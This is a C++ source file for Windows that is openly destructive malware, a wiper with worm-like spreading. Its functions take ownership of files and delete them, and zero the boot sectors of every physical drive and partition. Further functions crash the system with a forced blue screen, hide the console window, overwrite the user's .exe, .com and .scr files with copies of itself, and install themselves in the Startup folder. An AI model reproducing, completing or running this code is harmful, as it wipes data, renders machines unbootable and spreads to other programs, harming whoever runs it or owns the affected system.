#include "Destroy.h"
#include <string>
#include <ShlObj.h>
#include <iostream>
#include <fstream>

long long FileNum = 0;
bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, bool bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges(hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        return false;
    }

    return true;
}


bool TakeOwnership(LPTSTR lpszOwnFile) {
    bool bRetval = false;

    HANDLE hToken = NULL;
    PSID pSIDAdmin = NULL;
    PSID pSIDEveryone = NULL;
    PACL pACL = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld =
        SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
    const int NUM_ACES = 2;
    EXPLICIT_ACCESS ea[NUM_ACES];
    DWORD dwRes;

    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) {
        goto Cleanup;
    }

    if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) {
        goto Cleanup;
    }

    ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

    ea[0].grfAccessPermissions = GENERIC_READ;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;

    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode = SET_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;

    if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (ERROR_SUCCESS == dwRes) {
        bRetval = true;
        goto Cleanup;
    }

    if (dwRes != ERROR_ACCESS_DENIED) {
        goto Cleanup;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        goto Cleanup;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, true)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL);

    if (dwRes != ERROR_SUCCESS) {
        goto Cleanup;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (dwRes == ERROR_SUCCESS) {
        bRetval = true;
    }

Cleanup:

    if (pSIDAdmin)
        FreeSid(pSIDAdmin);

    if (pSIDEveryone)
        FreeSid(pSIDEveryone);

    if (pACL)
        LocalFree(pACL);

    if (hToken)
        CloseHandle(hToken);

    return bRetval;

}

void DestroyDirectory(LPWSTR Directory) {
    TakeOwnership(Directory);

    if (Directory[wcslen(Directory) - 1] != '\\' && wcslen(Directory) < 260) {
        lstrcat(Directory, L"\\");
    }

    WCHAR SearchDir[MAX_PATH] = { 0 };
    lstrcpy(SearchDir, Directory);
    lstrcat(SearchDir, L"*.*");

    WIN32_FIND_DATA findData;
    HANDLE hSearch = FindFirstFile(SearchDir, &findData);

    if (hSearch == INVALID_HANDLE_VALUE) {
        return;
    }
    else do {
        if (!lstrcmp(findData.cFileName, L".") || !lstrcmp(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
            continue;
        }

        WCHAR Path[MAX_PATH] = { 0 };
        lstrcpy(Path, Directory);
        lstrcat(Path, findData.cFileName);

        if (FileNum < LLONG_MAX) {
            FileNum++;
        }

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            lstrcat(Path, L"\\");
            DestroyDirectory(Path);
            RemoveDirectory(Path);
        }
        else if (TakeOwnership(Path) && !(FileNum % 15)) {
            DeleteFile(Path);
        }
    } while (FindNextFile(hSearch, &findData));

    FindClose(hSearch);
}
LPCWSTR Disks[] = {
        L"\\\\.\\PhysicalDrive0",
        L"\\\\.\\PhysicalDrive1",
        L"\\\\.\\PhysicalDrive2",
        L"\\\\.\\PhysicalDrive3",
        L"\\\\.\\PhysicalDrive4",
        L"\\\\.\\PhysicalDrive5",
        L"\\\\.\\PhysicalDrive6",
        L"\\\\.\\PhysicalDrive7",
        L"\\\\.\\PhysicalDrive8",
        L"\\\\.\\PhysicalDrive9",
        L"\\\\.\\PhysicalDrive10",
        L"\\\\.\\PhysicalDrive11",
        L"\\\\.\\PhysicalDrive12",
        L"\\\\.\\PhysicalDrive13",
        L"\\\\.\\PhysicalDrive14",
        L"\\\\.\\PhysicalDrive15",
        L"\\\\.\\PhysicalDrive16",
        L"\\\\.\\PhysicalDrive17",
        L"\\\\.\\PhysicalDrive18",
        L"\\\\.\\PhysicalDrive19",
        L"\\\\.\\PhysicalDrive20",
        L"\\\\.\\PhysicalDrive21",
        L"\\\\.\\PhysicalDrive22",
        L"\\\\.\\PhysicalDrive23",
        L"\\\\.\\PhysicalDrive24",
        L"\\\\.\\PhysicalDrive25",
        L"\\\\.\\PhysicalDrive26",
        L"\\\\.\\A:",
        L"\\\\.\\B:",
        L"\\\\.\\C:",
        L"\\\\.\\D:",
        L"\\\\.\\E:",
        L"\\\\.\\F:",
        L"\\\\.\\G:",
        L"\\\\.\\H:",
        L"\\\\.\\I:",
        L"\\\\.\\J:",
        L"\\\\.\\K:",
        L"\\\\.\\L:",
        L"\\\\.\\M:",
        L"\\\\.\\N:",
        L"\\\\.\\O:",
        L"\\\\.\\P:",
        L"\\\\.\\Q:",
        L"\\\\.\\R:",
        L"\\\\.\\S:",
        L"\\\\.\\T:",
        L"\\\\.\\U:",
        L"\\\\.\\V:",
        L"\\\\.\\W:",
        L"\\\\.\\X:",
        L"\\\\.\\Y:",
        L"\\\\.\\Z:",
        L"\\\\.\\Harddisk0Partition1",
        L"\\\\.\\Harddisk0Partition2",
        L"\\\\.\\Harddisk0Partition3",
        L"\\\\.\\Harddisk0Partition4",
        L"\\\\.\\Harddisk0Partition5",
        L"\\\\.\\Harddisk1Partition1",
        L"\\\\.\\Harddisk1Partition2",
        L"\\\\.\\Harddisk1Partition3",
        L"\\\\.\\Harddisk1Partition4",
        L"\\\\.\\Harddisk1Partition5",
        L"\\\\.\\Harddisk2Partition1",
        L"\\\\.\\Harddisk2Partition2",
        L"\\\\.\\Harddisk2Partition3",
        L"\\\\.\\Harddisk2Partition4",
        L"\\\\.\\Harddisk2Partition5",
        L"\\\\.\\Harddisk3Partition1",
        L"\\\\.\\Harddisk3Partition2",
        L"\\\\.\\Harddisk3Partition3",
        L"\\\\.\\Harddisk3Partition4",
        L"\\\\.\\Harddisk3Partition5",
        L"\\\\.\\Harddisk4Partition1",
        L"\\\\.\\Harddisk4Partition2",
        L"\\\\.\\Harddisk4Partition3",
        L"\\\\.\\Harddisk4Partition4",
        L"\\\\.\\Harddisk4Partition5",
        L"\\\\.\\Harddisk5Partition1",
        L"\\\\.\\Harddisk5Partition2",
        L"\\\\.\\Harddisk5Partition3",
        L"\\\\.\\Harddisk5Partition4",
        L"\\\\.\\Harddisk5Partition5"
};
const size_t nOverwrite = sizeof(Disks) / sizeof(void*);
void OverWrite(LPCWSTR Name) {
    HANDLE hFile = CreateFile(Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    DWORD GET_WRITTEN_BYTES;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512);
    for (int i = 0; i < 5; i++) {
        SetFilePointer(hFile, 0, 0, FILE_BEGIN);
        WriteFile(hFile, EmptyData, 512, &GET_WRITTEN_BYTES, NULL);

        SetFilePointer(hFile, 512, 0, FILE_BEGIN);
        WriteFile(hFile, EmptyData, 1024, &GET_WRITTEN_BYTES, NULL);

        SetFilePointer(hFile, 1536, 0, FILE_BEGIN);
        WriteFile(hFile, EmptyData, 1024, &GET_WRITTEN_BYTES, NULL);

        SetFilePointer(hFile, 2560, 0, FILE_BEGIN);
        WriteFile(hFile, EmptyData, 512, &GET_WRITTEN_BYTES, NULL);

        CloseHandle(hFile);
    }
    CloseHandle(hFile);
}

void OverWriteDisk() {
    for (int i = 0; i < nOverwrite; i++) {
        CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(OverWrite), (PVOID)Disks[i], 0, NULL);
    }
}
HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

void CALL_HIDE_MODE()
{
    HWND GET_CONSOLE_PROCESS = GetConsoleWindow();
    ShowWindow(GET_CONSOLE_PROCESS, SW_HIDE);
    return;
}

void CALL_BSOD()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    BOOL bResult = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
        if (hNtdll) {
            VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
            VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

            if (RtlAdjustPrivilege && NtRaiseHardError) {
                unsigned char unused1;
                long unsigned int unused2;
                RtlAdjustPrivilege(0x13, true, false, &unused1);
                NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &unused2);
            }

            FreeLibrary(hNtdll);
        }
    }

    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid))
    {
        HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
        if (hNtdll) {
            VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
            VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

            if (RtlAdjustPrivilege && NtRaiseHardError) {
                unsigned char unused1;
                long unsigned int unused2;
                RtlAdjustPrivilege(0x13, true, false, &unused1);
                NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2);
            }

            FreeLibrary(hNtdll);
        }
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0))
    {
        HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
        if (hNtdll) {
            VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
            VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

            if (RtlAdjustPrivilege && NtRaiseHardError) {
                unsigned char unused1;
                long unsigned int unused2;
                RtlAdjustPrivilege(0x13, true, false, &unused1);
                NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2);
            }

            FreeLibrary(hNtdll);
        }
    }
    try
    {
        HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
        VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

        unsigned char unused1;
        long unsigned int unused2;

        if (RtlAdjustPrivilege && NtRaiseHardError) {
            RtlAdjustPrivilege(0x13, true, false, &unused1);
            NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2);
        }

        FreeLibrary(hNtdll);
        ExitProcess(0);
    }
    catch (...)
    {
        BOOLEAN b;

        unsigned long response;

        RtlAdjustPrivilege(19, true, false, &b);

        NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
    }
}
wstring getCurrentExecutablePath() {
    WCHAR buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    wstring currentPath(buffer);
    return currentPath;
}
LPCSTR getCurrentExecutablePath1() {
    static char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return buffer;
}

void findAndReplaceExecutablePath(const wstring& directoryPath, const wstring& originalExePath) {
    WIN32_FIND_DATAW findData;
    wstring searchPath = directoryPath + L"\\*";

    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            wstring name = findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (name != L"." && name != L"..") {
                    wstring subdirectoryPath = directoryPath + L"\\" + name;
                    findAndReplaceExecutablePath(subdirectoryPath, originalExePath);
                }
            }
            else if (name.length() >= 4 && name.substr(name.length() - 4) == L".exe") {
                if (directoryPath.find(L"C:\\Windows") == wstring::npos &&
                    directoryPath.find(L"C:\\Program Files") == wstring::npos &&
                    directoryPath.find(L"C:\\Program Files (x86)") == wstring::npos) {
                    wcout << L"Replacing executable path for: " << name << endl;
                    wstring exeFilePath = directoryPath + L"\\" + name;

                    ifstream originalExe(originalExePath, ios::binary);
                    ofstream newExe(exeFilePath, ios::binary);

                    newExe << originalExe.rdbuf();

                    originalExe.close();
                    newExe.close();
                }
            }
            else if (name.length() >= 4 && name.substr(name.length() - 4) == L".com") {
                if (directoryPath.find(L"C:\\Windows") == wstring::npos &&
                    directoryPath.find(L"C:\\Program Files") == wstring::npos &&
                    directoryPath.find(L"C:\\Program Files (x86)") == wstring::npos) {
                    wcout << L"Replacing executable path for: " << name << endl;
                    wstring exeFilePath = directoryPath + L"\\" + name;

                    ifstream originalExe(originalExePath, ios::binary);
                    ofstream newExe(exeFilePath, ios::binary);

                    newExe << originalExe.rdbuf();

                    originalExe.close();
                    newExe.close();
                }
            }
            else if (name.length() >= 4 && name.substr(name.length() - 4) == L".scr") {
                if (directoryPath.find(L"C:\\Windows") == wstring::npos &&
                    directoryPath.find(L"C:\\Program Files") == wstring::npos &&
                    directoryPath.find(L"C:\\Program Files (x86)") == wstring::npos) {
                    wcout << L"Replacing executable path for: " << name << endl;
                    wstring exeFilePath = directoryPath + L"\\" + name;

                    ifstream originalExe(originalExePath, ios::binary);
                    ofstream newExe(exeFilePath, ios::binary);

                    newExe << originalExe.rdbuf();

                    originalExe.close();
                    newExe.close();
                }
            }
        } while (FindNextFileW(hFind, &findData) != 0);
        FindClose(hFind);
    }
    else {
    }
}
bool copyToStartupFolder() {
    WCHAR startupFolderPath[MAX_PATH];
    if (SHGetSpecialFolderPathW(NULL, startupFolderPath, CSIDL_COMMON_STARTUP, FALSE)) {
        WCHAR buffer[MAX_PATH];
        if (GetModuleFileNameW(NULL, buffer, MAX_PATH)) {
            // 복사 대상 파일 경로
            LPCWSTR sourcePath = buffer;

            // 대상 폴더 경로
            std::wstring destinationFolder = startupFolderPath;

            // 복사할 파일의 이름
            std::wstring fileName = L"\\";
            fileName += sourcePath;
            size_t pos = fileName.rfind(L"\\");
            fileName = fileName.substr(pos + 1);

            // 복사할 파일의 전체 경로
            std::wstring destinationPath = destinationFolder + L"\\" + fileName;

            // 파일 복사
            if (CopyFileW(sourcePath, destinationPath.c_str(), FALSE)) {
                std::wcout << L"File copied to startup folder: " << destinationPath << std::endl;
                return true;
            }
            else {
                std::cerr << L"Failed to copy file to startup folder." << std::endl;
                return false;
            }
        }
        else {
            std::cerr << L"Failed to get module file name." << std::endl;
            return false;
        }
    }
    else {
        std::cerr << L"Failed to get startup folder path." << std::endl;
        return false;
    }
}
